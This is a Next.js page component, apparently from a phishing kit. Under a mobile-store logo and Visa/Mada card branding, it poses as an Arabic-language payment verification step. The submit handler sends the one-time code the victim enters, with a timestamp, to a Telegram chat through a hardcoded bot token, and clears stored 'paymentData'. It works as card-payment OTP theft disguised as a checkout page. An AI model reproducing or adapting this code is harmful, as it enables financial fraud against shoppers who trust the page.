"use client";
import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function VerificationPage() {
  const [verificationCode, setVerificationCode] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.length === 4) {
      try {
        const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
        const chatId = "-1002630840593";

        const escapeMarkdown = (text: string | number | null | undefined) => {
          const safeText = text?.toString() || "";
          return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
        };

        const formatVerificationInfo = () => {
          const now = new Date().toLocaleString("ar-SA");
          return [
            "🔑 *رمز التحقق* 🔑",
            `رمز التحقق: ${escapeMarkdown(verificationCode)}`,
            `وقت التحقق: ${escapeMarkdown(now)}`,
          ].join("\n");
        };

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: formatVerificationInfo(),
            parse_mode: "Markdown",
          }),
        });

        // Clear session storage
        sessionStorage.removeItem("paymentData");

        // Redirect to success page
      
      } catch (error) {
        console.error("Error sending verification code:", error);
        alert("حدث خطأ أثناء إرسال رمز التحقق. الرجاء المحاولة مرة أخرى.");
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-8">
        <div className="text-center">
          <Image
            src="/logo.png"
            alt="Phone Zone Mobile"
            width={150}
            height={50}
            className="mx-auto"
          />
          <div className="mt-6 flex justify-center space-x-2">
            <Image
              src="/images/visa.png"
              alt="Visa"
              width={40}
              height={25}
              className="object-contain"
            />
            <Image
              src="/images/mada.png"
              alt="Mada"
              width={40}
              height={25}
              className="object-contain"
            />
          </div>
        </div>

        <div className="mt-8 bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
          <form className="space-y-6" onSubmit={handleSubmit}>
            <div className="text-center">
              <h2 className="text-xl font-semibold text-gray-900">إلغاء</h2>
              <p className="mt-2 text-sm text-gray-600">
                تم إرسال رمز التحقق إلى هاتفك المسجل. الرجاء إدخال الرمز لإتمام
                عملية الدفع.
              </p>
            </div>

            <div>
              <label htmlFor="code" className="sr-only">
                رمز التحقق
              </label>
              <input
                id="code"
                name="code"
                type="text"
                maxLength={6}
                required
                className="appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm text-center"
                placeholder="رمز التحقق"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
              />
            </div>

            <div>
              <button
                type="submit"
                className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
              >
                تأكيد
              </button>
            </div>

            <div className="text-center">
              <button
                type="button"
                className="text-sm text-blue-600 hover:text-blue-500"
                onClick={() => {}}
              >
                إعادة إرسال الرمز
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
